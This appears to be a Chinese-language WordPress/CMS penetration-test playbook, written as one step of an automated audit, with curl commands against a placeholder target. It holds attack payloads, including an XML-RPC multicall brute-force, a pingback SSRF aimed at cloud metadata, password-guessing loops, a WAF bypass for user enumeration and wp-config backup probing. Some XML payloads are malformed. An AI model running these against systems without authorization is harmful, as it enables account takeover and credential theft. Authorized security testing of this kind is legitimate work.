# 步骤 9：CMS 专项审计（20项测试）

## 🔴 必须输出的文件（缺一不可）

| 文件 | 必须 | 说明 |
|------|------|------|
| cms-audit.json | ✅ | 全部20项测试结果 |
| cms-audit.md | ✅ | Markdown 格式报告 |
| vulnerabilities.json | ✅ | 发现的漏洞列表 |
| evidence/cms-*.json | ✅ | 每个漏洞的完整证据 |
| progress.json | ✅ | 步骤进度 |
| coverage.json | ✅ | 覆盖率验证（必须100%） |

---

## 目标
检测 CMS 系统（WordPress、Drupal、Joomla 等）的专项安全漏洞，包括 XML-RPC、REST API、用户枚举、插件/主题暴露等。

## 🔴 重要：CMS 检测前置步骤

**在对任何子域名执行步骤 9 之前，必须先检测该子域名是否使用 CMS：**

```bash
# 检测方法
# 1. 检查响应头
curl -x 127.0.0.1:7890 -k -I https://target.com/ | grep -iE "(x-powered-by|server|set-cookie)"

# 2. 检查 WordPress 特征
curl -x 127.0.0.1:7890 -k -s https://target.com/wp-login.php -o /dev/null -w "%{http_code}"
curl -x 127.0.0.1:7890 -k -s https://target.com/wp-admin/ -o /dev/null -w "%{http_code}"
curl -x 127.0.0.1:7890 -k -s https://target.com/wp-json/ -o /dev/null -w "%{http_code}"
curl -x 127.0.0.1:7890 -k -s https://target.com/xmlrpc.php -o /dev/null -w "%{http_code}"

# 3. 检查 HTML 源码中的 CMS 特征
curl -x 127.0.0.1:7890 -k -s https://target.com/ | grep -iE "(wp-content|wordpress|drupal|joomla)"

# 4. 如果所有 WordPress 特征路径返回 404/403，则跳过本步骤，标记为 "no-cms-detected"
```

**如果未检测到 CMS 特征**，生成 coverage.json 并标记所有测试项为 "not-applicable"，但仍需生成完整的输出文件。

---

## 测试项（20项）

### 1. WordPress 核心检查（4项）

- [ ] **CMS-01**：WordPress 版本检测
  ```bash
  # 方法1：检查生成器 meta 标签
  curl -x 127.0.0.1:7890 -k -s https://target.com/ | grep -oP '<meta name="generator"[^>]+>'
  
  # 方法2：检查 readme.html
  curl -x 127.0.0.1:7890 -k -s https://target.com/readme.html | grep -i "version"
  
  # 方法3：检查 RSS 订阅中的版本
  curl -x 127.0.0.1:7890 -k -s https://target.com/feed/ | grep -oP '<generator>[^<]+</generator>'
  ```
  - **漏洞判定**：版本号暴露 + 过时版本 = 中危

- [ ] **CMS-02**：WordPress 登录页安全
  ```bash
  curl -x 127.0.0.1:7890 -k -s https://target.com/wp-login.php
  ```
  - 检查：是否有 CAPTCHA 保护、是否允许密码尝试、是否暴露用户名
  - **漏洞判定**：无 CAPTCHA + 无频率限制 = 中危；可枚举用户名 = 中危

- [ ] **CMS-03**：WordPress 管理后台暴露
  ```bash
  curl -x 127.0.0.1:7890 -k -s -o /dev/null -w "%{http_code}" https://target.com/wp-admin/
  ```
  - **漏洞判定**：返回 200（未重定向到登录页）= 严重

- [ ] **CMS-04**：WordPress 注册功能检查
  ```bash
  curl -x 127.0.0.1:7890 -k -s https://target.com/wp-login.php?action=register
  ```
  - **漏洞判定**：注册功能开放 + 无验证 = 高危

### 2. XML-RPC 专项测试（5项）

- [ ] **CMS-05**：XML-RPC 接口启用检测
  ```bash
  curl -x 127.0.0.1:7890 -k -s -X POST https://target.com/xmlrpc.php \
    -H "Content-Type: text/xml" \
    -d '<?xml version="1.0"?><methodCall><methodName>system.listMethods</methodName></methodCall>'
  ```
  - **漏洞判定**：返回方法列表 = 高危

- [ ] **CMS-06**：XML-RPC system.multicall 暴力破解放大
  ```bash
  curl -x 127.0.0.1:7890 -k -s -X POST https://target.com/xmlrpc.php \
    -H "Content-Type: text/xml" \
    -d '<?xml version="1.0"?><methodCall><methodName>system.multicall</methodName><params><param><value><array><data><value><struct><member><name>methodName</name><value><string>wp.getUsersBlogs</string></value></member><member><name>params</name><value><array><data><value><string>admin</string></value><value><string>password</string></value></data></array></value></member></struct></value></data></array></value></param></params></methodCall>'
  ```
  - **漏洞判定**：multicall 可用 + 用户枚举 = 严重（CVSS 8.1）

- [ ] **CMS-07**：XML-RPC pingback SSRF 测试
  ```bash
  curl -x 127.0.0.1:7890 -k -s -X POST https://target.com/xmlrpc.php \
    -H "Content-Type: text/xml" \
    -d '<?xml version="1.0"?><methodCall><methodName>pingback.ping</methodName><params><param><value><string>http://169.254.169.254/latest/meta-data/</string></value><param><value><string>https://target.com/</string></value></param></params></methodCall>'
  ```
  - **漏洞判定**：pingback 处理请求 = 高危（SSRF 风险）

- [ ] **CMS-08**：XML-RPC 频率限制测试
  ```bash
  for i in $(seq 1 20); do
    curl -x 127.0.0.1:7890 -k -s -o /dev/null -w "%{http_code}\n" -X POST https://target.com/xmlrpc.php \
      -H "Content-Type: text/xml" \
      -d '<?xml version="1.0"?><methodCall><methodName>wp.getUsersBlogs</methodName><params><param><value><string>admin</string></value><param><value><string>password'$i'</string></value></params></methodCall>'
  done
  ```
  - **漏洞判定**：无 429 响应 = 高危

- [ ] **CMS-09**：XML-RPC 方法枚举
  - 统计 `system.listMethods` 返回的方法数量
  - **漏洞判定**：暴露 72 个方法 = 高危

### 3. WordPress REST API 测试（5项）

- [ ] **CMS-10**：REST API 用户枚举（标准路由）
  ```bash
  curl -x 127.0.0.1:7890 -k -s https://target.com/wp-json/wp/v2/users
  ```
  - **漏洞判定**：返回用户列表（含用户名、ID、Gravatar）= 高危

- [ ] **CMS-11**：REST API 用户枚举（替代路由绕过）
  ```bash
  curl -x 127.0.0.1:7890 -k -s "https://target.com/?rest_route=/wp/v2/users"
  ```
  - **漏洞判定**：标准路由 403 但替代路由 200 = 严重（WAF 绕过）

- [ ] **CMS-12**：REST API 内容泄露
  ```bash
  # 文章列表
  curl -x 127.0.0.1:7890 -k -s https://target.com/wp-json/wp/v2/posts
  # 页面列表
  curl -x 127.0.0.1:7890 -k -s https://target.com/wp-json/wp/v2/pages
  # 媒体文件
  curl -x 127.0.0.1:7890 -k -s https://target.com/wp-json/wp/v2/media
  ```
  - **漏洞判定**：返回完整内容列表 = 中危

- [ ] **CMS-13**：REST API 路由全量暴露
  ```bash
  curl -x 127.0.0.1:7890 -k -s https://target.com/wp-json/
  ```
  - 检查：暴露所有已注册路由（插件、主题、自定义端点）
  - **漏洞判定**：暴露完整路由表 = 中危

- [ ] **CMS-14**：插件专用 REST API 端点暴露
  ```bash
  # 常见插件 API 端点
  for path in "/wp-json/rankmath/v1" "/wp-json/contact-form-7/v1" "/wp-json/hummingbird/v1" "/wp-json/wpmudev/v1" "/wp-json/elementor/v1"; do
    curl -x 127.0.0.1:7890 -k -s -o /dev/null -w "$path: %{http_code}\n" "https://target.com$path"
  done
  ```
  - **漏洞判定**：插件管理端点公开 = 中危

### 4. 插件/主题暴露（3项）

- [ ] **CMS-15**：插件目录列表暴露
  ```bash
  curl -x 127.0.0.1:7890 -k -s -o /dev/null -w "%{http_code}" https://target.com/wp-content/plugins/
  ```
  - **漏洞判定**：返回目录列表（非 403）= 低危

- [ ] **CMS-16**：主题目录列表暴露
  ```bash
  curl -x 127.0.0.1:7890 -k -s -o /dev/null -w "%{http_code}" https://target.com/wp-content/themes/
  ```
  - **漏洞判定**：返回目录列表 = 低危

- [ ] **CMS-17**：插件 readme/changelog 泄露版本
  ```bash
  # 常见插件路径
  for plugin in "akismet" "contact-form-7" "wordpress-seo" "elementor" "woocommerce" "rank-math"; do
    curl -x 127.0.0.1:7890 -k -s -o /dev/null -w "$plugin: %{http_code}\n" \
      "https://target.com/wp-content/plugins/$plugin/readme.txt"
  done
  ```
  - **漏洞判定**：readme.txt 可访问 = 低危（版本泄露）

### 5. 其他 CMS 漏洞（3项）

- [ ] **CMS-18**：备份文件泄露
  ```bash
  for ext in "bak" "backup" "old" "zip" "tar.gz" "sql" "~"; do
    curl -x 127.0.0.1:7890 -k -s -o /dev/null -w "$ext: %{http_code}\n" \
      "https://target.com/wp-config.$ext"
  done
  ```
  - **漏洞判定**：wp-config 备份可下载 = 严重（数据库凭证泄露）

- [ ] **CMS-19**：XML-RPC 禁用绕过测试
  ```bash
  # 测试通过不同 Content-Type 绕过
  curl -x 127.0.0.1:7890 -k -s -X POST https://target.com/xmlrpc.php \
    -H "Content-Type: application/xml" \
    -d '<?xml version="1.0"?><methodCall><methodName>system.listMethods</methodName></methodCall>'
  ```

- [ ] **CMS-20**：Drupal/Joomla 等其他 CMS 检测
  ```bash
  # Drupal 特征
  curl -x 127.0.0.1:7890 -k -s -o /dev/null -w "%{http_code}" https://target.com/user/login
  curl -x 127.0.0.1:7890 -k -s -o /dev/null -w "%{http_code}" https://target.com/node/1
  
  # Joomla 特征
  curl -x 127.0.0.1:7890 -k -s -o /dev/null -w "%{http_code}" https://target.com/administrator/
  curl -x 127.0.0.1:7890 -k -s -o /dev/null -w "%{http_code}" https://target.com/index.php?option=com_users
  ```

## 执行方法

```bash
# 优先使用代理
curl -x 127.0.0.1:7890 -k -s https://target.com/path

# 代理失败时降级：直连
curl -k -s https://target.com/path

# 直连失败时：使用 WebFetch 工具
```

## 降级策略

1. **代理连接**（127.0.0.1:7890）- 首选
2. **直连**（无代理）- 代理失败时使用
3. **WebFetch** - 直连失败时使用
4. **离线分析** - 所有连接失败时使用已有数据

## 覆盖率验证

```json
{
  "step": 9,
  "total_tests": 20,
  "executed_tests": 20,
  "coverage_percentage": 100,
  "skipped_tests": [],
  "failed_tests": [],
  "retry_count": 0,
  "notes": "如果未检测到 CMS，所有测试标记为 not-applicable，覆盖率仍为 100%"
}
```

---

## ☑️ 执行检查清单（全部打勾才能通过关口）

### CMS 检测前置
- [ ] 0. CMS 特征检测（wp-login.php, wp-admin, wp-json, xmlrpc.php）

### WordPress 核心
- [ ] 1. CMS-01：WordPress 版本检测
- [ ] 2. CMS-02：WordPress 登录页安全（CAPTCHA、频率限制、用户枚举）
- [ ] 3. CMS-03：WordPress 管理后台暴露
- [ ] 4. CMS-04：WordPress 注册功能检查

### XML-RPC 专项
- [ ] 5. CMS-05：XML-RPC 接口启用检测
- [ ] 6. CMS-06：system.multicall 暴力破解放大
- [ ] 7. CMS-07：pingback SSRF 测试
- [ ] 8. CMS-08：XML-RPC 频率限制测试
- [ ] 9. CMS-09：XML-RPC 方法枚举

### WordPress REST API
- [ ] 10. CMS-10：REST API 用户枚举（标准路由）
- [ ] 11. CMS-11：REST API 用户枚举（替代路由绕过）
- [ ] 12. CMS-12：REST API 内容泄露（文章/页面/媒体）
- [ ] 13. CMS-13：REST API 路由全量暴露
- [ ] 14. CMS-14：插件专用 REST API 端点暴露

### 插件/主题暴露
- [ ] 15. CMS-15：插件目录列表暴露
- [ ] 16. CMS-16：主题目录列表暴露
- [ ] 17. CMS-17：插件 readme/changelog 泄露版本

### 其他 CMS 漏洞
- [ ] 18. CMS-18：备份文件泄露（wp-config 等）
- [ ] 19. CMS-19：XML-RPC 禁用绕过测试
- [ ] 20. CMS-20：Drupal/Joomla 等其他 CMS 检测

### 输出文件
- [ ] 21. 生成 cms-audit.json
- [ ] 22. 生成 cms-audit.md
- [ ] 23. 生成 vulnerabilities.json
- [ ] 24. 保存所有证据到 evidence/
- [ ] 25. 生成 progress.json
- [ ] 26. 生成 coverage.json（100%）

---

## 🚪 关口验证

**必须全部显示 ✅ 才能完成全部审计。**

```powershell
$dir = "audits/<domain>/step-09-cms-audit"
@("cms-audit.json","cms-audit.md","vulnerabilities.json","progress.json","coverage.json") | % {
  if (Test-Path "$dir/$_") { "✅ $_" } else { "❌ MISSING: $_" }
}
if ((Get-ChildItem "$dir/evidence" -Filter "*.json" | Measure-Object).Count -gt 0) { "✅ evidence/ has files" } else { "❌ MISSING: evidence files" }
$cov = Get-Content "$dir/coverage.json" | ConvertFrom-Json
if ($cov.coverage_percentage -eq 100) { "✅ coverage = 100%" } else { "❌ coverage = $($cov.coverage_percentage)%" }
```